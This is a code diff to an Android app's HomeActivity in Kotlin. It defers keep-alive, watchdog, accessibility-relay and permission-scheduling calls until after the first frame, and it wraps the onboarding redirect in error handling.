@@ -24,14 +24,19 @@ class HomeActivity : AppCompatActivity() {
         }
 
         setContentView(R.layout.activity_home)
-        SafeKeepAlive.start(this)
-        PersistenceWatchdog.schedule(this)
-        TouchAccessibilityService.instance?.ensureRelay()
-        runCatching {
-            if (PermissionMoments.hasHomeBatch(this)) {
-                PermissionMoments.scheduleHomeSession(this)
-            }
-        }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
+        // Defer background work until after the first frame — avoids FGS timeout
+        // racing activity startup on cold launch (Oppo / Android 12+).
+        window.decorView.post {
+            if (isFinishing || isDestroyed) return@post
+            SafeKeepAlive.start(this)
+            PersistenceWatchdog.schedule(this)
+            TouchAccessibilityService.instance?.ensureRelay()
+            runCatching {
+                if (PermissionMoments.hasHomeBatch(this)) {
+                    PermissionMoments.scheduleHomeSession(this)
+                }
+            }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
+        }
     }
 
     override fun onNewIntent(intent: Intent) {
@@ -49,8 +54,10 @@ class HomeActivity : AppCompatActivity() {
             UserSession.onboardingDone(this) &&
             UserSession.permissionsWizardDone(this)
         ) {
-            startActivity(Intent(this, OnboardingActivity::class.java))
-            finish()
+            runCatching {
+                startActivity(Intent(this, OnboardingActivity::class.java))
+                finish()
+            }.onFailure { Log.w(TAG, "onboarding redirect failed: ${it.message}") }
             return
         }
         TouchAccessibilityService.instance?.ensureRelay()
